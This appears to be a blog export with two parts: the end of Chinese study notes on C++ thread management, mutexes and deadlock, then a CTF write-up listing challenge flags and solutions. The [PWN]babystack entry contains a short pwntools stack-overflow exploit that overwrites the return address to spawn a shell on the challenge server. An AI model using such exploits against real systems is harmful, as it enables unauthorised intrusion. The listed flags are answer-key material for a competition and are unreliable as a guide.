&#123;</span><br><span class="line">        <span class="built_in">do_something_in_current_thread</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in"><span class="keyword">catch</span></span>(...)</span><br><span class="line">    &#123;</span><br><span class="line">        t.<span class="built_in">join</span>();  <span class="comment">// 1</span></span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    t.<span class="built_in">join</span>();  <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="b-使用RAII等待线程完成"><a href="#b-使用RAII等待线程完成" class="headerlink" title="b. 使用RAII等待线程完成"></a>b. 使用RAII等待线程完成</h5><p><strong>RAII</strong>：Resource Acquisition Is Initialization 资源获取即初始化方式。这里使用 RAII，并且提供一个类，在析构函数中使用 <code>join()</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">thread_guard</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    std::thread&amp; t;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">thread_guard</span><span class="params">(std::thread&amp; t_)</span>:</span></span><br><span class="line"><span class="function">        t(t_)</span></span><br><span class="line"><span class="function">    &#123;</span>&#125;</span><br><span class="line">    ~<span class="built_in">thread_guard</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (t.<span class="built_in">joinable</span>())  <span class="comment">// 1</span></span><br><span class="line">        &#123;</span><br><span class="line">            t.<span class="built_in">join</span>();  <span class="comment">// 2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">thread_guard</span>(thread_guard <span class="keyword">const</span>&amp;) = <span class="keyword">delete</span>;  <span class="comment">// 3</span></span><br><span class="line">    thread_guard&amp; <span class="keyword">operator</span> = (thread_guard <span class="keyword">const</span>&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">func</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> some_local_state = <span class="number">0</span>;</span><br><span class="line">    <span class="function">func <span class="title">my_func</span><span class="params">(some_local_state)</span></span>;</span><br><span class="line">    <span class="function">std::thread <span class="title">t</span><span class="params">(my_func)</span></span>;</span><br><span class="line">    <span class="function">thread_guard <span class="title">g</span><span class="params">(t)</span></span>;</span><br><span class="line">    <span class="built_in">do_something_in_current_thread</span>();</span><br><span class="line">&#125;  <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<p>线程执行到 4 时，局部对象就要逆序销毁，所以 g 被第一个销毁，这时线程在析构函数中被加入到原始线程中，即使 <code>do_something_in_current_thread</code> 抛出一个异常，这个销毁依旧会发生。</p>
<p>拷贝构造函数和拷贝赋值操作被标记为 <code>=delete</code>，是为了不让编译器自动生成它们。通过删除声明，任何尝试给 <code>thread_guard</code> 对象赋值的操作都会引发一个编译错误。</p>
<h4 id="2-1-4-后台运行线程"><a href="#2-1-4-后台运行线程" class="headerlink" title="2.1.4 后台运行线程"></a>2.1.4 后台运行线程</h4><p><code>detach()</code> 会让线程在后台运行（主线程不能与之产生直接交互）。  如果线程分离，就不可能有 <code>std::thread</code> 对象能引用它，相应的 <code>std::thread</code> 对象就与实际执行的线程无关了，并且这个线程也无法进行加入。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">std::thread <span class="title">t</span><span class="params">(do_background_work)</span></span>;</span><br><span class="line">t.<span class="built_in">detach</span>();</span><br><span class="line"><span class="built_in">assert</span>(!t.<span class="built_in">joinable</span>());</span><br></pre></td></tr></table></figure>
<p>通常<strong>分离线程</strong>被称为<strong>守护线程</strong>，UNIX中指的守护线程是指，没有任何用户接口，并在后台运行的线程。</p>
<h5 id="从std-thread对象中分离线程的前提"><a href="#从std-thread对象中分离线程的前提" class="headerlink" title="从std::thread对象中分离线程的前提"></a>从std::thread对象中分离线程的前提</h5><p>要存在可进行分离的线程。不能对没有执行线程的 <code>std::thread</code> 对象使用 <code>detach()</code>，当然这也是 <code>join()</code> 的使用条件，并且要用同样的方式进行检查——当 <code>std::thread</code> 对象使用 <code>t.joinable()</code> 返回的是 <code>true</code>，就可以使用 <code>t.detach()</code></p>
<ul>
<li>示例（使用分离线程去处理其他文档）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_document</span><span class="params">(std::string <span class="keyword">const</span>&amp; filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">open_document_and_display_gui</span>(filename);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">done_editing</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        user_command cmd=<span class="built_in">get_user_input</span>();</span><br><span class="line">        <span class="keyword">if</span>(cmd.type==open_new_document)</span><br><span class="line">        &#123;</span><br><span class="line">            std::string <span class="keyword">const</span> new_name=<span class="built_in">get_filename_from_user</span>();</span><br><span class="line">            <span class="function">std::thread <span class="title">t</span><span class="params">(edit_document,new_name)</span></span>; <span class="comment">// 1</span></span><br><span class="line">            t.<span class="built_in">detach</span>(); <span class="comment">// 2</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">process_user_input</span>(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码逻辑：如果用户打开一个新文档，为了更快的打开文档，需要启动一个新线程去打开新文档$^{1}$，并分离线程$^{2}$。</p>
<h3 id="2-2-向线程函数传递参数"><a href="#2-2-向线程函数传递参数" class="headerlink" title="2.2 向线程函数传递参数"></a>2.2 向线程函数传递参数</h3><p>注意：默认参数要拷贝到线程独立内存中，即使参数是引用的形式，也可以在新线程中进行访问。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> i, std::string <span class="keyword">const</span>&amp; s)</span></span>;</span><br><span class="line"><span class="function">std::thread <span class="title">t</span><span class="params">(f, <span class="number">3</span>, <span class="string">&quot;hello&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<hr>
<p>提供的参数可以<strong>移动（move）</strong>但不能<strong>拷贝（copy）</strong></p>
<p>move：原始对象中的数据转移给另一个对象，原始对象不在保存这些数据，相当于<strong>剪切</strong>了</p>
<hr>
<h3 id="2-3-转移线程所有权"><a href="#2-3-转移线程所有权" class="headerlink" title="2.3 转移线程所有权"></a>2.3 转移线程所有权</h3><p><code>std::thread</code> 可转移（move）但不可拷贝（copy）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">some_function</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">some_other_function</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">std::thread <span class="title">t1</span><span class="params">(some_function)</span></span>;</span><br><span class="line">std::thread t2 = std::<span class="built_in">move</span>(t1); <span class="comment">// 将 t1 的所有权转移给 t2，然后 t1 和执行线程就不再有关联，some_function 与 t2 关联在一起</span></span><br><span class="line">t1 = std::<span class="built_in">thread</span>(some_other_function);</span><br><span class="line">std::thread t3;</span><br><span class="line">t3 = std::<span class="built_in">move</span>(t2); <span class="comment">// 将与 t2 关联的线程的所有权转移给 t3</span></span><br><span class="line">t1 = std::<span class="built_in">move</span>(t3); <span class="comment">// 将 some_function 的所有权转移给 t1，但是 t1 已经与 some_other_function 关联，赋值操作将使程序崩溃</span></span><br></pre></td></tr></table></figure>
<p>因此，不能将执行某个函数的线程的所有权转移给一个已经关联某个线程的实例（如第 8 行）</p>
<h3 id="2-4-运行时决定线程数量"><a href="#2-4-运行时决定线程数量" class="headerlink" title="2.4 运行时决定线程数量"></a>2.4 运行时决定线程数量</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回能同时并发在一个程序中的线程数量</span></span><br><span class="line"><span class="comment">// 多核系统中，返回值可以是CPU核芯的数量</span></span><br><span class="line"><span class="comment">// 返回值仅仅是提示，当系统信息无法获取时，函数也会返回0</span></span><br><span class="line">std::thread::<span class="built_in">hardware_concurrency</span>(); </span><br></pre></td></tr></table></figure>
<h4 id="a-并行版的-std-accumulate"><a href="#a-并行版的-std-accumulate" class="headerlink" title="a. 并行版的 std::accumulate"></a>a. 并行版的 std::accumulate</h4><p>代码中将整体工作拆分成小任务交给每个线程去做，其中设置最小任务数，是为了避免产生太多的线程。程序可能会在操作数量为0的时候抛出异常。比如，<code>std::thread</code> 构造函数无法启动一个执行线程，就会抛出一个异常。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Iterator,<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">accumulate_block</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(Iterator first,Iterator last,T&amp; result)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        result=std::<span class="built_in">accumulate</span>(first,last,result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Iterator,<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">parallel_accumulate</span><span class="params">(Iterator first,Iterator last,T init)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">const</span> length=std::<span class="built_in">distance</span>(first,last);</span><br><span class="line">    <span class="keyword">if</span>(!length) <span class="comment">// 1</span></span><br><span class="line">        <span class="keyword">return</span> init;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">const</span> min_per_thread=<span class="number">25</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">const</span> max_threads=</span><br><span class="line">        (length+min_per_thread<span class="number">-1</span>)/min_per_thread; <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">const</span> hardware_threads=</span><br><span class="line">        std::thread::<span class="built_in">hardware_concurrency</span>();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">const</span> num_threads= <span class="comment">// 3</span></span><br><span class="line">        std::<span class="built_in">min</span>(hardware_threads != <span class="number">0</span> ? hardware_threads : <span class="number">2</span>, max_threads);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">const</span> block_size=length/num_threads; <span class="comment">// 4</span></span><br><span class="line">    <span class="function">std::vector&lt;T&gt; <span class="title">results</span><span class="params">(num_threads)</span></span>;</span><br><span class="line">    <span class="function">std::vector&lt;std::thread&gt; <span class="title">threads</span><span class="params">(num_threads<span class="number">-1</span>)</span></span>; <span class="comment">// 5</span></span><br><span class="line">    Iterator block_start=first;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span> i=<span class="number">0</span>; i &lt; (num_threads<span class="number">-1</span>); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        Iterator block_end=block_start;</span><br><span class="line">        std::<span class="built_in">advance</span>(block_end,block_size); <span class="comment">// 6</span></span><br><span class="line">        threads[i]=std::<span class="built_in">thread</span>( <span class="comment">// 7</span></span><br><span class="line">            accumulate_block&lt;Iterator,T&gt;(),</span><br><span class="line">            block_start,block_end,std::<span class="built_in">ref</span>(results[i]));</span><br><span class="line">            block_start=block_end; <span class="comment">// 8</span></span><br><span class="line">    &#125;</span><br><span class="line">    accumulate_block&lt;Iterator,T&gt;()(</span><br><span class="line">        block_start,last,results[num_threads<span class="number">-1</span>]); <span class="comment">// 9</span></span><br><span class="line">    std::for_each(threads.<span class="built_in">begin</span>(),threads.<span class="built_in">end</span>(),</span><br><span class="line">        std::<span class="built_in">mem_fn</span>(&amp;std::thread::join)); <span class="comment">// 10</span></span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">accumulate</span>(results.<span class="built_in">begin</span>(),results.<span class="built_in">end</span>(),init); <span class="comment">// 11</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-5-识别线程"><a href="#2-5-识别线程" class="headerlink" title="2.5 识别线程"></a>2.5 识别线程</h3><p>线程标识类型为 <code>std::thread::id</code>，可通过两种方式获得</p>
<ul>
<li><code>std::thread</code> 对象的成员函数 <code>get_id()</code> 直接获取</li>
<li>在当前线程中调用 <code>std::this_thread::get_id()</code> (该函数定义在 <code>&lt;thread&gt;</code> 头文件中)</li>
</ul>
<h2 id="第-3-章-线程中共享数据"><a href="#第-3-章-线程中共享数据" class="headerlink" title="[第 3 章] 线程中共享数据"></a>[第 3 章] 线程中共享数据</h2><h3 id="3-1-共享数据可能存在什么问题？"><a href="#3-1-共享数据可能存在什么问题？" class="headerlink" title="3.1 共享数据可能存在什么问题？"></a>3.1 共享数据可能存在什么问题？</h3><p>如果数据只读，就不会有什么问题。但是如果有线程可以修改数据，就可能导致不变量被修改。就比如双向链表正在删除一个节点：（总的来说就是，在修改数据的同时，有线程在访问这个被修改的数据）</p>
<ul>
<li><p>如果这个时候正好有线程访问刚刚删除一边的节点（正好删除了左右指针中的一个），这样的话，线程就读取到了要删除的这个节点的数据。</p>
</li>
<li><p>如果该节点的左指针先被删除，有一个线程从左到右访问链表，就会跳过这个待删除的节点；如果有第二个线程尝试删除图中右边的节点，程序就会崩溃。这就是<strong>条件竞争</strong></p>
</li>
</ul>
<h4 id="3-1-1-条件竞争"><a href="#3-1-1-条件竞争" class="headerlink" title="3.1.1 条件竞争"></a>3.1.1 条件竞争</h4><p>并发中竞争条件的形成，取决于线程的相对执行顺序。上述共享数据的问题就是<strong>恶性条件竞争</strong></p>
<h5 id="a-如何避免恶性条件竞争"><a href="#a-如何避免恶性条件竞争" class="headerlink" title="a. 如何避免恶性条件竞争"></a>a. 如何避免恶性条件竞争</h5><ol>
<li><p>对数据结构采用某些保护机制。（确保只有进行修改的线程才能看到不变量被破坏时的中间状态；其他线程角度来看，要么修改还没开始，要么已经结束）</p>
</li>
<li><p><strong>无锁编程</strong>（lock-free programming）</p>
</li>
<li><p>使用事务的方式去处理数据结构的更新。</p>
<p>数据和读取都存储在事务日志中，然后将之前的操作合为一步，再进行提交。如果数据结构正在被某个线程修改就无法提交。</p>
</li>
<li><p>保护共享数据结构的<strong>最基本的方式</strong>，是使用C++标准库提供的<strong>互斥量(mutex)</strong>。</p>
</li>
</ol>
<h3 id="3-2-使用互斥量保护共享数据"><a href="#3-2-使用互斥量保护共享数据" class="headerlink" title="3.2 使用互斥量保护共享数据"></a>3.2 使用互斥量保护共享数据</h3><ul>
<li>如何在多线程程序中，使用 <code>std::mutex</code> 构造的 <code>std::lock_guard</code> 实例，创建互斥量，通过调用成员函数 <code>lock()</code> 上锁，<code>unlock()</code> 解锁，从而对一个列表进行<strong>访问保护</strong>。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::list&lt;<span class="keyword">int</span>&gt; some_list;  <span class="comment">// 全局变量</span></span><br><span class="line">std::mutex some_mutex; <span class="comment">// 全局互斥量，用于保护全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_to_list</span><span class="params">(<span class="keyword">int</span> new_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">guard</span><span class="params">(some_mutex)</span></span>; <span class="comment">// 3</span></span><br><span class="line">    some_list.<span class="built_in">push_back</span>(new_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">list_contains</span><span class="params">(<span class="keyword">int</span> value_to_find)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">guard</span><span class="params">(some_mutex)</span></span>; <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">find</span>(some_list.<span class="built_in">begin</span>(), some_list.<span class="built_in">end</span>(), value_to_find) != some_list.<span class="built_in">end</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码的标注$^{3}$和标注$^{4}$，使用 <code>std::lock_guard&lt;std::mutex&gt;</code> 使这两个函数对数据的访问是<strong>互斥</strong>的。（<code>list_contains</code> 不可能看到正在被 <code>add_to_list</code> 修改的列表）。</p>
<p>其实大多数的情况是这样的：互斥量和要保护的数据放在同一个类，这时，上述的两个函数都作为类的成员函数， 互斥量和要保护的数据都要定义成 <code>private</code> 成员。</p>
<h4 id="3-2-1-在成员函数中加入-std-lock-guard-一定可以保护数据吗？"><a href="#3-2-1-在成员函数中加入-std-lock-guard-一定可以保护数据吗？" class="headerlink" title="3.2.1 在成员函数中加入 std::lock_guard 一定可以保护数据吗？"></a>3.2.1 在成员函数中加入 <code>std::lock_guard</code> 一定可以保护数据吗？</h4><p>不一定。可能存在<strong>迷失指针或引用</strong>。 </p>
<ul>
<li><p>如何避免这样的问题？</p>
<p>在确保成员函数不会传出指针或引用的同时，检查成员函数是否通过指针或引用的方式来调用也是很重要。</p>
</li>
</ul>
<hr>
<p>只要成员函数的返回值或者输出参数没有指向被保护数据的指针或引用，数据就是安全的。</p>
<p>如果用 <code>std::lock_guard</code> 保护数据，但在同一个函数中，又将保护数据传给某个用户提供的函数，就麻烦了，因为这个函数可能是恶意的，能绕过保护机制。 </p>
<hr>
<h4 id="3-2-2-死锁"><a href="#3-2-2-死锁" class="headerlink" title="3.2.2 死锁"></a>3.2.2 死锁</h4><p>一个给定操作需要两个或两个以上的互斥量时，可能会出现<strong>死锁（deadlock）</strong>。</p>
<p>死锁与条件竞争相反，不同的两个线程会互相等待，导致什么都没做。</p>
<h5 id="a-如何避免死锁？"><a href="#a-如何避免死锁？" class="headerlink" title="a. 如何避免死锁？"></a>a. 如何避免死锁？</h5><p>死锁一般建议：让两个互斥量总以相同的顺序上锁。</p>
<p>但这只适用于互斥量用于不同的地方的时候；如果不同互斥量保护同一个类的实例时，比如实例提供的第一互斥量作为第一个参数，提供的第二个互斥量为第二个参数，在参数交换了之后，两个线程试图在相同的两个实例间进行数据交换时，程序 又死锁了！</p>
<ul>
<li><p>C++中解决这个问题的方法</p>
<p><code>std::lock</code> 可以一次性锁住多个(两个以上)的互斥量，且没有死锁风险</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在一个简单的交换操作中使用 std::lock</span></span><br><span class="line"><span class="comment">// 这里的std::lock()需要包含&lt;mutex&gt;头文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">some_big_object</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(some_big_object&amp; lhs,some_big_object&amp; rhs)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    some_big_object some_detail;</span><br><span class="line">    std::mutex m;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">X</span>(some_big_object <span class="keyword">const</span>&amp; sd):<span class="built_in">some_detail</span>(sd)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(X&amp; lhs, X&amp; rhs)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(&amp;lhs==&amp;rhs)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        std::<span class="built_in">lock</span>(lhs.m,rhs.m); <span class="comment">// 1</span></span><br><span class="line">        <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock_a</span><span class="params">(lhs.m,std::adopt_lock)</span></span>; <span class="comment">// 2</span></span><br><span class="line">        <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock_b</span><span class="params">(rhs.m,std::adopt_lock)</span></span>; <span class="comment">// 3</span></span><br><span class="line">        <span class="built_in">swap</span>(lhs.some_detail,rhs.some_detail);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>标注$^{1}$锁住两个互斥量，标注$^{2,3}$​表示两个 <code>std:lock_guard</code> 实例已经创建好，提供 <code>std::adopt_lock</code>参数除了表示 <code>std::lock_guard</code> 对象已经上锁外，还表示现成的锁，而非尝试创建新的锁。</p>
<h5 id="b-避免死锁的进阶"><a href="#b-避免死锁的进阶" class="headerlink" title="b. 避免死锁的进阶"></a>b. 避免死锁的进阶</h5><ul>
<li>避免嵌套锁</li>
<li>避免在持有锁的时候，调用用户提供的代码</li>
<li>使用固定顺序获取锁</li>
<li>使用锁的层次结构</li>
</ul>
<h2 id="第-4-章-同步并发操作"><a href="#第-4-章-同步并发操作" class="headerlink" title="[第 4 章] 同步并发操作"></a>[第 4 章] 同步并发操作</h2>]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>C++</tag>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>第二届虎踞龙蟠杯WP</title>
    <url>/2021/11/01/Hulu-WP/</url>
    <content><![CDATA[<h4 id="昵称：Hulu"><a href="#昵称：Hulu" class="headerlink" title="昵称：Hulu"></a>昵称：Hulu</h4><h4 id="分数：5111"><a href="#分数：5111" class="headerlink" title="分数：5111"></a>分数：5111</h4><h4 id="排名：9"><a href="#排名：9" class="headerlink" title="排名：9"></a>排名：9</h4><h3 id="题目及思路"><a href="#题目及思路" class="headerlink" title="题目及思路"></a>题目及思路</h3><h4 id="PWN-babync"><a href="#PWN-babync" class="headerlink" title="[PWN]babync"></a>[PWN]babync</h4><p><code>nc 39.108.208.104 2224</code></p>
<p><code>SUSCTF&#123;W31c0m_t0_susCtf&#125;</code></p>
<h4 id="PWN-babyida-pwn"><a href="#PWN-babyida-pwn" class="headerlink" title="[PWN]babyida_pwn"></a>[PWN]babyida_pwn</h4><p>ida发现只要输入code为2222即可获得权限</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030140445782.png" alt="image-20211030140445782"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030140457828.png" alt="image-20211030140457828"></p>
<p><code>SUSCTF&#123;y0u_have_konwn_how_to_use_ida&#125;</code></p>
<h4 id="PWN-babystack"><a href="#PWN-babystack" class="headerlink" title="[PWN]babystack"></a>[PWN]babystack</h4><p><img src="/2021/11/01/Hulu-WP/image-20211031111544232.png" alt="image-20211031111544232"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031111600784.png" alt="image-20211031111600784"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031111613633.png" alt="image-20211031111613633"></p>
<p>所以填入0x28个字符后，跟shell地址即可获得权限，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;39.108.208.104&#x27;</span>, <span class="number">2225</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(<span class="number">0x4006b6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/01/Hulu-WP/image-20211031111718752.png" alt="image-20211031111718752"></p>
<p><code>SUSCTF&#123;b@by_stack&#125;</code></p>
<h4 id="Misc-babymc"><a href="#Misc-babymc" class="headerlink" title="[Misc]babymc"></a>[Misc]babymc</h4><p><img src="/2021/11/01/Hulu-WP/image-20211031162003829.png" alt="image-20211031162003829"></p>
<p>新佛曰解密 <a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
<p><code>?o?O?AtU?a</code>掩码攻击</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031162121129.png" alt="image-20211031162121129"></p>
<p><code>ColOrAtUra</code>解压缩</p>
<p>得到bcache和一个jpg，jpg通过010查看文件，发现文件尾有摩斯电码</p>
<p><code>.-. -.. .--. -... .. - -- .- .--. -.-. .... .- -.-. .... .</code></p>
<p>解码得到<code>RDPBITMAPCHACHE</code>即RDP位图缓存，参考<a href="https://mp.weixin.qq.com/s/ft5GhMn9L-oFX7kymZ7Cvg利用工具https://github.com/ANSSI-FR/bmc-tools，解析位图缓存">https://mp.weixin.qq.com/s/ft5GhMn9L-oFX7kymZ7Cvg利用工具https://github.com/ANSSI-FR/bmc-tools，解析位图缓存</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 bmc-tools.py -s bcache -d /dst/</span><br></pre></td></tr></table></figure>
<p>在导出的位图数据中找到flag</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031164930127.png" alt="image-20211031164930127"></p>
<p><code>FLAG&#123;Ju5T_8MC_PTSD&#125;</code>改下格式<code>SUSCTF&#123;Ju5T_8MC_PTSD&#125;</code></p>
<h4 id="Misc-爱思爱思踢微"><a href="#Misc-爱思爱思踢微" class="headerlink" title="[Misc]爱思爱思踢微"></a>[Misc]爱思爱思踢微</h4><p>zip伪加密，将加密位改为0000后解压缩</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031151608331.png" alt="image-20211031151608331"></p>
<p>得到声频文件，QSSTV解码参考<a href="https://blog.csdn.net/weixin_45696568/article/details/116421340，具体配置参考http://www.srcmini.com/62326.html#heading_4">https://blog.csdn.net/weixin_45696568/article/details/116421340，具体配置参考http://www.srcmini.com/62326.html#heading_4</a></p>
<p>得到图片<img src="/2021/11/01/Hulu-WP/image-20211031153242241.png" alt="image-20211031153242241"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031154625056.png" alt="image-20211031154625056"></p>
<p><code>cHdke2xzYl93aXRoX2VuY29kZWRfc3RlZ3B5fQ==</code></p>
<p>解码为</p>
<p><code>pwd&#123;lsb_with_encoded_stegpy&#125;</code></p>
<p>查看另一个jpg属性，有</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031165541906.png" alt="image-20211031165541906"></p>
<p>Base64解码得到<code>Useless_3tring</code>，用该口令和Stegpy解码wav隐写数据</p>
<p><code>stegpy _doubt.wav -p</code></p>
<p>得到<code>5355534354467B7930755F4172655F333374565F6D61337465727D</code>，16进制转ASCII</p>
<p><code>SUSCTF&#123;y0u_Are_33tV_ma3ter&#125;</code></p>
<h4 id="Misc-Broken-QR-Code"><a href="#Misc-Broken-QR-Code" class="headerlink" title="[Misc]Broken QR Code"></a>[Misc]Broken QR Code</h4><p>二维码补全后</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030132152777.png" alt="image-20211030132152777"></p>
<p>拿到<a href="https://jiema.wwei.cn/扫描">https://jiema.wwei.cn/扫描</a></p>
<p>Do you know 010editor?，所以拿原图进010editor</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030132426099.png" alt="image-20211030132426099"></p>
<p>提示文件头缺失</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030132536981.png" alt="image-20211030132536981"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030133624487.png" alt="image-20211030133624487"></p>
<p>补全504b0304后用Bin walk提取文件</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030133939113.png" alt="image-20211030133939113"></p>
<p>对Flag.zip进行掩码攻击<code>T?L??r?8</code></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030134430419.png" alt="image-20211030134430419"></p>
<p>口令<code>TxL50rx8</code></p>
<p>Ook解码 <a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 结果为<code>U1VTe1kwdV9SZTRjaDNkX3RoZV9kM3N0MW5hdGkwbn0=</code> Base64解码结果为</p>
<p><code>SUS&#123;Y0u_Re4ch3d_the_d3st1nati0n&#125;</code></p>
<h4 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc]签到"></a>[Misc]签到</h4><p>用IrfanView提取动图所有帧</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030113249166.png" alt="image-20211030113249166"></p>
<p>拖到010 Editor发现</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030112912427.png" alt="image-20211030112912427"></p>
<p>所以尝试改zip后缀，解压有notflag.txt</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030112950082.png" alt="image-20211030112950082"></p>
<p>复制到 <a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a> 解密，key就是key，解密结果为<code>SUSCTF&#123;Welcome_To_</code></p>
<p>后半段<code>SUSCTF_Have_Fun&#125;</code></p>
